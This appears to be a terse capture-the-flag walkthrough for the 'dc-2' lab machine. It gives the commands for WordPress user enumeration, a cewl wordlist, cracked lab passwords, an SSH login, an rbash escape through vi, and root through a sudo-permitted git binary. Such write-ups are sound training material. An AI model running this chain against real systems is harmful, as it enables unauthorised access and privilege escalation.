@@ -1,0 +1,52 @@
+Scanning through nmap
+22,80 and 7744 ports is open in this machine
+
+Now edit /etc/hosts file and save ip to dc-2 domain.
+
+find directory through dirsearch tool,
+wp-admin directory is showing.
+
+try to enumerate a username.
+Command:- wpscan --url http://dc-2/ --enumerate u
+Result:- tom,jerry,admin
+
+
+try to generate a wordlist using cewl
+Command:- cewl http://dc-2/
+
+Now brute force the password,
+tom:parturient
+jerry:adipiscing
+
+When using both the credentials for login, there is no any loopholes from victim website.
+
+now login through 7744 port which running on ssh
+ssh tom@dc-2 -p 7744
+
+now i get user shell;
+but there is no any command we are using like cd,ls,pwd many more
+
+when we use echo $PATH
+/home/tom/usr/bin which is using rbash, first we need to escape rbash shell
+
+now using vi
+$vi    open vi
+
+:set shell=/bin/bash
+:shell and then exit the vi
+
+now i get local.txt file, when we read flag3.txt
+Hint: Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+
+Now try to change the user
+$su jerry 
+
+now get jerry user shell
+
+sudo -l command is showing ((root) NOPASSWD: /usr/bin/git)
+
+find git binary on gtfobins website.
+
+$sudo git -p help config then run !/bin/sh hit enter get root shell
+open proof.txt file and go to bed
+ 
